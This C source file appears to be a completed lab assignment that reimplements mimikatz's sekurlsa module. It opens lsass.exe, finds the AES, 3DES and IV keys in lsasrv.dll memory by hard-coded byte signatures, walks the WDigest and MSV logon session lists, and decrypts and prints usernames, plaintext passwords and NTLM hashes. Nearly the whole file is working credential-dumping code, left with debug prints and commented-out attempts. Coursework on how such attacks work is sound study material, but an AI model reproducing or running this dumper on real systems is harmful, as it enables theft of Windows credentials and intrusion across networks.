#include "sekurlsa.h"
#include "utils.h"
#include <stdio.h>

#pragma comment (lib, "bcrypt.lib")

#define AES_128_KEY_LENGTH	16
#define DES_3DES_KEY_LENGTH	24

/*****************************************************
 *         module level global variables             *
 *****************************************************/

BYTE g_sekurlsa_IV[AES_128_KEY_LENGTH];
BYTE g_sekurlsa_AESKey[AES_128_KEY_LENGTH];
BYTE g_sekurlsa_3DESKey[DES_3DES_KEY_LENGTH];
HANDLE g_hLsass = 0;

/*****************************************************
 *         ���µĺ�������������޸Ŀ�ֱ�ӵ���           *
 *****************************************************/

 /// ���Ҳ����� lsass.exe ���̵�PID
DWORD GetLsassPid() {

	PROCESSENTRY32 entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
				CloseHandle(hSnapshot);
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

/// ��ȡ PID Ϊ pid �Ľ��̾��
HANDLE GrabLsassHandle(IN DWORD pid) {
	HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	return procHandle;
}

VOID SetGlobalLsassHandle() {
	g_hLsass = GrabLsassHandle(GetLsassPid());
}

VOID PrepareUnprotectLsassMemoryKeys() {
	SetGlobalLsassHandle();
	LocateUnprotectLsassMemoryKeys();

	puts("");
	printf("[+] Aes Key recovered as:\n");
	HexdumpBytes(g_sekurlsa_AESKey, AES_128_KEY_LENGTH);

	printf("[+] InitializationVector recovered as:\n");
	HexdumpBytes(g_sekurlsa_IV, AES_128_KEY_LENGTH);

	printf("[+] 3Des Key recovered as:\n");
	HexdumpBytes(g_sekurlsa_3DESKey, DES_3DES_KEY_LENGTH);

	printf("[+] Not all zeros ... \n");
	printf("[+] All keys seems OK ... \n\n");
}

/// ���� mem ָ��ָ����ڴ����� [mem,mem+0x200000] �������ֽ����� signature �״γ��ֵ�ƫ�ƣ�������
DWORD SearchPattern(IN PUCHAR mem, IN PUCHAR signature, IN DWORD signatureLen) {
	for (DWORD offset = 0; offset < 0x200000; offset++)
		if (mem[offset] == signature[0] && mem[offset + 1] == signature[1])
			if (memcmp(mem + offset, signature, signatureLen) == 0)
				return offset;
	return 0;
}

/// �� lsass.exe ���̵��ڴ��еĵ�ַ addr �϶�ȡ memOutLen ���ֽڴ���ָ�� memOut ��
SIZE_T ReadFromLsass(IN LPCVOID addr, OUT LPVOID memOut, IN SIZE_T memOutLen) {
	SIZE_T bytesRead = 0;
	memset(memOut, 0, memOutLen);
	ReadProcessMemory(g_hLsass, addr, memOut, memOutLen, &bytesRead);
	return bytesRead;
}

/// ʹ�� g_sekurlsa_IV g_sekurlsa_AESKey ���� g_sekurlsa_3DESKey �Ի�����lsass.exe�ڴ��е�ƾ�ݽ��н���
ULONG DecryptCredentials(PCHAR encrypedPass, DWORD encryptedPassLen, PUCHAR decryptedPass, ULONG decryptedPassLen) {
	BCRYPT_ALG_HANDLE hProvider, hDesProvider;
	BCRYPT_KEY_HANDLE hAes, hDes;
	ULONG result;
	NTSTATUS status;
	unsigned char initializationVector[16];

	// Same IV used for each cred, so we need to work on a local copy as this is updated
	// each time by BCryptDecrypt
	memcpy(initializationVector, g_sekurlsa_IV, sizeof(g_sekurlsa_IV));

	if (encryptedPassLen % 8) {
		// If suited to AES, lsasrv uses AES in CFB mode
		status = BCryptOpenAlgorithmProvider(&hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptGenerateSymmetricKey(hProvider, &hAes, NULL, 0, g_sekurlsa_AESKey, sizeof(g_sekurlsa_AESKey), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptDecrypt(hAes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, sizeof(g_sekurlsa_IV), decryptedPass, decryptedPassLen, &result, 0);
		if (status != 0) {
			return 0;
		}
		return result;
	}
	else {
		// If suited to 3DES, lsasrv uses 3DES in CBC mode
		status = BCryptOpenAlgorithmProvider(&hDesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptGenerateSymmetricKey(hDesProvider, &hDes, NULL, 0, g_sekurlsa_3DESKey, sizeof(g_sekurlsa_3DESKey), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptDecrypt(hDes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, 8, decryptedPass, decryptedPassLen, &result, 0);
		if (status != 0) {
			return 0;
		}
		return result;
	}
}

BOOL getUnicodeString(PUNICODE_STRING string)
{
	BOOL status = FALSE;
	PVOID source = string->Buffer;
	string->Buffer = (PWSTR)LocalAlloc(LPTR, string->MaximumLength);
	SIZE_T bytesRead = ReadFromLsass(source, string->Buffer, string->MaximumLength);
	return status;
}

PUNICODE_STRING ExtractUnicodeString(PUNICODE_STRING pUnicodeString) {
	PUNICODE_STRING pResult;
	PWSTR mem;

	// Read LSA_UNICODE_STRING from lsass memory
	pResult = (PUNICODE_STRING)LocalAlloc(LPTR, sizeof(UNICODE_STRING));
	if (pResult == NULL) return NULL;
	ReadFromLsass(pUnicodeString, pResult, sizeof(UNICODE_STRING));

	// Read the buffer contents for the LSA_UNICODE_STRING from lsass memory
	mem = LocalAlloc(LPTR, pResult->MaximumLength);
	if (mem == NULL) return NULL;
	ReadFromLsass(pResult->Buffer, mem, pResult->MaximumLength);
	pResult->Buffer = mem;
	return pResult;
}

VOID FreeUnicodeString(UNICODE_STRING* unicode) {
	LocalFree(unicode->Buffer);
	LocalFree(unicode);
}

/*****************************************************
 *         ���ϵĺ����������޸Ŀ�ֱ�ӵ���               *
 *****************************************************/












 /*****************************************************
  *  �뽫���µ�����������д��������ʵ�ֶ�Ӧ�Ĺ���         *
  *    - LocateUnprotectLsassMemoryKeys               *
  *	  - GetCredentialsFromMSV                        *
  *	  - GetCredentialsFromWdigest                    *
  *****************************************************/

  /// �� lsass.exe �ڴ��ж�ȡ��������ƾ�ݽ���AES���ܻ���3DES����ʹ�õ���Կ
  /// ������Ӧ��ȫ�ֱ��� g_sekurlsa_IV g_sekurlsa_AESKey g_sekurlsa_3DESKey
  /// �Ƽ�API: SearchPattern() ReadFromLsass()
VOID LocateUnprotectLsassMemoryKeys() {
	DWORD keySigOffset = 0;
	DWORD aesOffset = 0;
	DWORD desOffset = 0;
	DWORD ivOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY hAesKey;
	KIWI_BCRYPT_HANDLE_KEY h3DesKey;
	KIWI_BCRYPT_KEY81 extractedAesKey;
	KIWI_BCRYPT_KEY81 extractedDesKey;
	BYTE extractedIV[16] = { 0 };
	PVOID keyPointer = NULL;

	// ��lsass.exe�����ص�ģ��lsasrv.dll�����뵱ǰ���̵��ڴ�ռ���
	// �������صĻ���ַ lsasrvBaseAddress �� lsass.exe ������ lsasrv.dll ģ��Ļ���ַ����ͬ��
	// ��ͬһ��DLLģ���ڲ�ͬ�����лᱻ���ص�ͬһ��ַ�� ALSR �������Ӱ�����Ϊ��
	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");

	// lsasrv.dll ģ���е�ȫ�ֱ��� hAesKey ��һ��ָ��ʵ��AES��Կ�Ľṹ��ָ�룬��������λhAesKey��lsass.exe�����еĵ�ַ

	// ����Ӳ������ֽ�����ǩ����Windows 10��Windows 11�ϲ��Կ��ã���Win10��Win11����ʧЧ
	UCHAR keyAESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
						0x48, 0x8d, 0x45, 0xe0,
						0x44, 0x8b, 0x4d, 0xd8,
						0x48, 0x8d, 0x15 };

	// lsasrv.dll �� keyAESSig �ֽ���������Ӧ��ָ���࣬���� 99 2C 10 00 (С���� 0x102c99)
	// Ϊȫ�ֱ��� hAesKey ���ڵ�ַ�����һ��ָ���ַ0x1800752BF��ƫ��
	// �� hAesKey �ṹ�����ڵĵ�ַΪ 0x1800752BF + 0x102c99 = 0x180177F58
	// .text:00000001800752AB 83 64 24 30 00          and     [rsp+70h+var_40], 0
	// .text:00000001800752B0 48 8D 45 E0             lea     rax, [rbp + pbBuffer]
	// .text:00000001800752B4 44 8B 4D D8             mov     r9d, dword ptr[rbp + var_28]; cbKeyObject
	// .text:00000001800752B8 48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 
	// .text:00000001800752BF 48 8B 0D 9A 2C 10 00    mov     rcx, cs:?hAesProvider ; hAlgorithm
	//       ^^^^^^^^^^^^^^^^ ע���г��ֵľ��Ե�ַ 0x1800752BF ���� win11��lsasrv.dll Ϊ������ͬ

	// ��lsass���̵��ڴ���������λȫ�ֱ���hAesKey���ڴ�λ��
	// ��ȡ����ָ�� and [rsp+70h+var_40], 0 ���lsasrv.dllģ���ַ��ƫ��
	keySigOffset = SearchPattern(lsasrvBaseAddress, keyAESSig, sizeof keyAESSig);
	printf("keySigOffset = 0x%x\n", keySigOffset);	// 0x752AB (00000001800752AB & 0xFFFFF)
	if (keySigOffset == 0) return;

	// ��lsass���̵��ڴ�λ��lsasrvBaseAddress + keySigOffset + sizeof keyAESSig �϶�ȡ4�ֽڵ�ƫ��
	//                     0x180000000       + 0x752AB      + 16              = 0x1800752bb
	// *(DWORD *)(0x1800752bb) = 0x102c99
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyAESSig, &aesOffset, sizeof aesOffset);
	printf("aesOffset = 0x%x\n", aesOffset);	// 0x102c99
	//			0x1800752bb�K
	//				48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 0x1800752B8�J         ^^ ^^ ^^ ^^


	// ��lsass���̵��ڴ�λ��lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset �϶�ȡ8�ֽڵ�����
	//                     0x180000000       + 0x752AB      + 16              + 4 + 0x102c99  = 0x180177f58
	//
	// .data:0000000180177F58 ?? ?? ?? ?? ?? ?? ?? ?? ?hAesKey@@3PEAXEA dq ?
	// ����ȡ��8�ֽڵ�������һ��ָ��ṹ�� KIWI_BCRYPT_HANDLE_KEY ��ָ��
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset, &keyPointer, sizeof keyPointer);
	printf("keyPointer = 0x%p\n", keyPointer); // ���� 0x000002318B910230
	//                       ^ �����ڴ���16�ֽڶ��룬�����4bit��Ϊ0

// ��lsass���̵��ڴ�λ�� keyPointer ��ȡ���ṹ���ʵ������
// ���� keyPointer δ֪����ʵ���������޷�ʹ��IDA Proͨ����̬�����õ�
	ReadFromLsass(keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// ��ȡ KIWI_BCRYPT_HANDLE_KEY �ṹ��������Ϊ PKIWI_BCRYPT_KEY81 �ĳ�Ա����ָ����ָ��� KIWI_BCRYPT_KEY81 �ṹ��
	// AES DES ��Կ��ʹ�� KIWI_BCRYPT_KEY81 �ṹ�����
	ReadFromLsass(hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY81));

	// KIWI_BCRYPT_KEY81 �� hardkey.data������Կ�ֽ����ݣ� hardkey.cbSecret������Կ�ĳ���
	memcpy(g_sekurlsa_AESKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);

	printf("AES Key Located (len %d): ", extractedAesKey.hardkey.cbSecret);
	HexdumpBytesPacked(extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
	puts("");

	// �������λȫ�ֱ��� h3DesKey InitializationVector ����ص���Կ����
	// ����ȫ�ֱ��� g_sekurlsa_IV g_sekurlsa_3DESKey ��
	// ~ 30 lines of code
	UCHAR keyDESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
						0x48, 0x8d, 0x45, 0xe0,
						0x44, 0x8b, 0x4d, 0xd4,
						0x48, 0x8d, 0x15 };

	keySigOffset = SearchPattern(lsasrvBaseAddress, keyDESSig, sizeof keyDESSig);
	printf("keySigOffset = 0x%x\n", keySigOffset);
	if (keySigOffset == 0) return;

	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyDESSig, &desOffset, sizeof desOffset);
	printf("desOffset = 0x%x\n", desOffset);

	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyDESSig + 4 + desOffset, &keyPointer, sizeof keyPointer);
	printf("keyPointer = 0x%p\n", keyPointer);

	ReadFromLsass(keyPointer, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	ReadFromLsass(h3DesKey.key, &extractedDesKey, sizeof(KIWI_BCRYPT_KEY81));

	memcpy(g_sekurlsa_3DESKey, extractedDesKey.hardkey.data, extractedDesKey.hardkey.cbSecret);

	printf("DES Key Located (len %d): ", extractedDesKey.hardkey.cbSecret);
	HexdumpBytesPacked(extractedDesKey.hardkey.data, extractedDesKey.hardkey.cbSecret);
	puts("");

	UCHAR keyIVSig[] = { 0x8b, 0xd8,
						0x85, 0xc0,
						0x78, 0x4d,
						0x44, 0x8d, 0x4e, 0xf2,
						0x44, 0x8b, 0xc6,
						0x48, 0x8d, 0x15 };

	keySigOffset = SearchPattern(lsasrvBaseAddress, keyIVSig, sizeof keyIVSig);
	printf("keySigOffset = 0x%x\n", keySigOffset);
	if (keySigOffset == 0) return;

	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);
	printf("ivOffset = 0x%x\n", ivOffset);

	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyIVSig + 4 + ivOffset, &extractedIV, sizeof extractedIV);

	memcpy(g_sekurlsa_IV, extractedIV, sizeof extractedIV);

	//	printf("IV Located (len %d): ", AES_128_KEY_LENGTH);
	//	HexdumpBytesPacked(keyPointer, AES_128_KEY_LENGTH);
	//	puts("");

}

/// ����Wdigest�������ڴ��е���������
VOID GetCredentialsFromWdigest() {
	KIWI_WDIGEST_LIST_ENTRY entry;
	DWORD logSessListSigOffset, logSessListOffset;
	PUCHAR logSessListAddr = 0;
	PUCHAR llCurrent;
	unsigned char passDecrypted[1024];

	// ����LocateUnprotectLsassMemoryKeys�еĲ���
	// ��λwdigest.dllģ���е�ȫ�ֱ��� l_LogSessList 
	// ~ 5 lines of code
	PUCHAR wdigestBaseAddress = (PUCHAR)LoadLibraryA("wdigest.dll");
	UCHAR logSessSig[] = {0x48, 0xff, 0x15, 0xe6, 0x5c, 0x01, 0x00, 
						0x0f, 0x1f, 0x44, 0x00, 0x00,
						0x48, 0x8b, 0x1d, 0x3a, 0xd1, 0x01, 0x00,
						0x48, 0x8d, 0x0d };

	logSessListSigOffset = SearchPattern(wdigestBaseAddress, logSessSig, sizeof logSessSig);
	printf("logSessListSigOffset = 0x%x\n", logSessListSigOffset);
	if (logSessListSigOffset == 0) return;

	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof logSessSig, &logSessListOffset, sizeof logSessListOffset);
	printf("logSessListOffset = 0x%x\n", logSessListOffset);

	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof logSessSig + 4 + logSessListOffset, &logSessListAddr, sizeof logSessListAddr);
	printf("logSessListAddr = 0x%p\n", logSessListAddr);

	ReadFromLsass(logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));
	printf("entry = 0x%p\n", entry);

	llCurrent = (PUCHAR)entry.This;

	printf("offsetof UserName = 0x%llx\n", offsetof(KIWI_WDIGEST_LIST_ENTRY, UserName));	// ӦΪ 0x30
	printf("offsetof Password = 0x%llx\n", offsetof(KIWI_WDIGEST_LIST_ENTRY, Password));  // ӦΪ 0x50 ��win10 win11����֤��Ч��

	do {
		memset(&entry, 0, sizeof(entry));
		ReadFromLsass(llCurrent, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

		if (entry.UsageCount == 1) {
			UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(llCurrent + offsetof(KIWI_WDIGEST_LIST_ENTRY, UserName)));
			UNICODE_STRING* password = ExtractUnicodeString((PUNICODE_STRING)(llCurrent + offsetof(KIWI_WDIGEST_LIST_ENTRY, Password)));

			if (username != NULL && username->Length != 0) printf("Username: %ls\n", username->Buffer);
			else printf("Username: [NULL]\n");

			// Check if password is present
			if (password->Length != 0 && (password->Length % 2) == 0) {
				// Decrypt password using recovered AES/3Des keys and IV
				if (DecryptCredentials((char*)password->Buffer, password->MaximumLength, passDecrypted, sizeof(passDecrypted)) > 0) {
					/*int len = sizeof(passDecrypted) / sizeof(char);
					for (int i = 0; i < len - 1; i++) {
						if (passDecrypted[i] == '\0') {
							if (passDecrypted[i + 1] == '\0')
								break;
							for (int j = i; j < len - 1; j++) {
								passDecrypted[j] = passDecrypted[j + 1];
							}
							passDecrypted[len - 1] = '\0';
							len--;
							i--;
						}
					}*/
					wprintf(L"Password: %ls\n\n", (wchar_t*)passDecrypted);
				}
			}
			else {
				printf("Password: [NULL]\n\n");
			}

			FreeUnicodeString(username);
			FreeUnicodeString(password);
		}
		llCurrent = (PUCHAR)entry.Flink;
	} while (llCurrent != logSessListAddr);
	return;
}

/// �Ƽ�API: LoadLibraryA() SearchPattern() ReadFromLsass() DecryptCredentials() ExtractUnicodeString() FreeUnicodeString()
/// �Ƽ�ʹ�ýṹ��: 
///   KIWI_BASIC_SECURITY_LOGON_SESSION_DATA 
///   KIWI_MSV1_0_CREDENTIALS 
///   KIWI_MSV1_0_PRIMARY_CREDENTIALS
///   KUHL_M_SEKURLSA_ENUM_HELPER
VOID GetCredentialsFromMSV() {
	KUHL_M_SEKURLSA_ENUM_HELPER helper = { 0 };
	helper.offsetToCredentials = FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials);
	helper.offsetToUsername = FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName);

	//
	// ~ 10 lines of code 
	//
	DWORD LogonSessionListSigOffset, LogonSessionListOffset;
	PUCHAR LogonSessionListAddr = 0;
	LIST_ENTRY LogonSessionList;
	unsigned char passDecrypted[1024];
	PUCHAR lsasvrBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");
	UCHAR LogonSessionListSig[] = { 0x0f, 0x1f, 0x44, 0x00, 0x00,
									0x8b, 0xc7,
									0x48, 0xc1, 0xe0, 0x04,
									0x48, 0x8d, 0x0d };

	LogonSessionListSigOffset = SearchPattern(lsasvrBaseAddress, LogonSessionListSig, sizeof LogonSessionListSig);
	printf("LogonSessionListSigOffset = 0x%x\n", LogonSessionListSigOffset);
	if (LogonSessionListSigOffset == 0) return;

	ReadFromLsass(lsasvrBaseAddress + LogonSessionListSigOffset + sizeof LogonSessionListSig, &LogonSessionListOffset, sizeof LogonSessionListOffset);
	printf("LogonSessionListOffset = 0x%x\n", LogonSessionListOffset);

	ReadFromLsass(lsasvrBaseAddress + LogonSessionListSigOffset + sizeof LogonSessionListSig + 4 + LogonSessionListOffset, &LogonSessionList, sizeof(LIST_ENTRY));
	ReadFromLsass(lsasvrBaseAddress + LogonSessionListSigOffset + sizeof LogonSessionListSig + 4 + LogonSessionListOffset, &LogonSessionListAddr, sizeof LogonSessionListAddr);


	PKIWI_MSV1_0_LIST_63  LogonSessionListptr = LogonSessionList.Flink;
	//ReadFromLsass(LogonSessionList.Flink, &LogonSessionListptr, sizeof(PKIWI_MSV1_0_LIST_63));
	printf("LogonSessionListptr = 0x%p\n", LogonSessionListptr);

	//KIWI_MSV1_0_LIST_63 LogonSessionList_First = *(LogonSessionListptr);
	KIWI_MSV1_0_LIST_63 LogonSessionList_First;
	ReadFromLsass(LogonSessionListptr, &LogonSessionList_First, sizeof(KIWI_MSV1_0_LIST_63));
	//ReadFromLsass(LogonSessionList_First.Flink, &LogonSessionListptr, sizeof(PKIWI_MSV1_0_LIST_63));
	//printf("LogonSessionListptr = 0x%p\n", LogonSessionListptr);

	//ReadFromLsass(LogonSessionListptr, &LogonSessionList_First, sizeof(KIWI_MSV1_0_LIST_63));
	//ReadFromLsass(LogonSessionList_First.Flink, &LogonSessionListptr, sizeof(PKIWI_MSV1_0_LIST_63));
	//printf("LogonSessionListptr = 0x%p\n", LogonSessionListptr);

	//UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(&LogonSessionListptr->UserName));
	//UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(&(LogonSessionList_First.UserName)));
	//UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(&((*LogonSessionListptr).UserName)));
	//if (username != NULL && username->Length != 0) printf("Username: %ls\n", username->Buffer);
	//else printf("Username: [NULL]\n");

	do {
		//PBYTE ptr = (PBYTE)LogonSessionListptr; // ...
		//KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData = { 0 };
		//sessionData.UserName = (PUNICODE_STRING)(ptr + helper.offsetToUsername);
		//sessionData.pCredentials = *(PVOID*)(ptr + helper.offsetToCredentials);
		KIWI_MSV1_0_CREDENTIALS credentials;
		KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
		PKIWI_MSV1_0_CREDENTIALS pcredentials;
		PKIWI_MSV1_0_PRIMARY_CREDENTIALS pprimaryCredentials;
		PMSV1_0_PRIMARY_CREDENTIAL_10_1607  pBuffer;

		//
		// ~ 10 lines of code
		//
		UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(&((*LogonSessionListptr).UserName)));
		if (username != NULL && username->Length != 0) printf("Username: %ls\n", username->Buffer);
		else printf("Username: [NULL]\n");
		printf("UserName = 0x%p\n", &((*LogonSessionListptr).UserName));
		printf("Credentials = 0x%p\n", &((*LogonSessionListptr).Credentials));

		//PKIWI_MSV1_0_CREDENTIALS pcredentials = (*LogonSessionListptr).Credentials;
		//printf("pcredentials = 0x%p\n", pcredentials);
		//ReadFromLsass((*LogonSessionListptr).Credentials, &credentials, sizeof(KIWI_MSV1_0_CREDENTIALS));
		//ReadFromLsass(credentials.PrimaryCredentials, &primaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS));
		ReadFromLsass(&((*LogonSessionListptr).Credentials), &pcredentials, sizeof(PKIWI_MSV1_0_CREDENTIALS));
		//ReadFromLsass(pcredentials, &credentials, sizeof(KIWI_MSV1_0_CREDENTIALS));
		printf("pcredentials = 0x%p\n", pcredentials);

		//why?????
		//pcredentials = (*LogonSessionListptr).Credentials;
		//printf("pcredentials = 0x%p\n", pcredentials);
		
		//ReadFromLsass(pprimaryCredentials, &primaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS));

		ReadFromLsass(&((*pcredentials).PrimaryCredentials), &pprimaryCredentials, sizeof(PKIWI_MSV1_0_PRIMARY_CREDENTIALS));
		printf("pprimaryCredentials = 0x%p\n", pprimaryCredentials);
		//UNICODE_STRING* bBuffer = ExtractUnicodeString((PUNICODE_STRING)(&((*pprimaryCredentials).Primary)));
		//printf("pprimaryCredentials.C = 0x%s\n", (char*)bBuffer->Buffer);
		//ReadFromLsass(&((*pprimaryCredentials).Credentials.Buffer), &pBuffer, sizeof(PMSV1_0_PRIMARY_CREDENTIAL_10_1607));
		//printf("pBuffer = 0x%p\n", pBuffer);

		//BYTE* NTLM = (*pBuffer).NtOwfPassword;
		//printf("NTLM = 0x%p\n", NTLM);
		//UNICODE_STRING* NTLM = ExtractUnicodeString((PUNICODE_STRING)&(primaryCredentials.Credentials));
		UNICODE_STRING* SBuffer = ExtractUnicodeString((PUNICODE_STRING)(&((*pprimaryCredentials).Credentials)));
		//UNICODE_STRING* SBuffer = ExtractUnicodeString((PUNICODE_STRING)(pprimaryCredentials+0x28));
		if (SBuffer != NULL && SBuffer->Length != 0) {
			if (DecryptCredentials((char*)SBuffer->Buffer, SBuffer->MaximumLength, passDecrypted, sizeof(passDecrypted)) > 0) {
				
				PMSV1_0_PRIMARY_CREDENTIAL_10_1607 abc = (PMSV1_0_PRIMARY_CREDENTIAL_10_1607) passDecrypted;
				BYTE *ab = abc->NtOwfPassword;

				int len = sizeof(abc->NtOwfPassword) / sizeof(abc->NtOwfPassword[0]);

				printf("NTLM: ");
				printf("0x");
				for (int i = 0; i < len; i++) {
					printf("%02x", abc->NtOwfPassword[i]);
				}
				printf("\n\n");

				//wprintf(L"NTLM: %ls\n\n", (wchar_t*)(passDecrypted));
				//printf("NTLM: %s\n\n", passDecrypted);
			}
		}
		else printf("NTLM: \n\n\n");

		//credentials = *(KIWI_MSV1_0_CREDENTIALS*)sessionData.pCredentials;
		//primaryCredentials = *(credentials.PrimaryCredentials);

	//	if (msvCredentials = (PBYTE)primaryCredentials.Credentials.Buffer) {
	//		if (*(PBOOLEAN)(msvCredentials + 0x4a)) {
	//			wprintf(L"\n\t * LM       : ");
	//			UNICODE_STRING* LM = ExtractUnicodeString((PUNICODE_STRING)(msvCredentials + 0x4a));
	//			if (LM->Length != 0) {
	//				if (DecryptCredentials((char*)LM->Buffer, LM->MaximumLength, passDecrypted, sizeof(passDecrypted)) > 0) {
	//					wprintf(L"LM: %ls\n\n", (wchar_t*)passDecrypted);
	//				}
	//			}
	//			else {
	//				printf("LM: [NULL]\n\n");
	//			}
	//			FreeUnicodeString(LM);
	//		}
	//	}

		FreeUnicodeString(username);
		FreeUnicodeString(SBuffer);

		ReadFromLsass(LogonSessionList_First.Flink, &LogonSessionListptr, sizeof(PKIWI_MSV1_0_LIST_63));
		ReadFromLsass(LogonSessionListptr, &LogonSessionList_First, sizeof(KIWI_MSV1_0_LIST_63));
	} while (LogonSessionListptr != LogonSessionListAddr);
}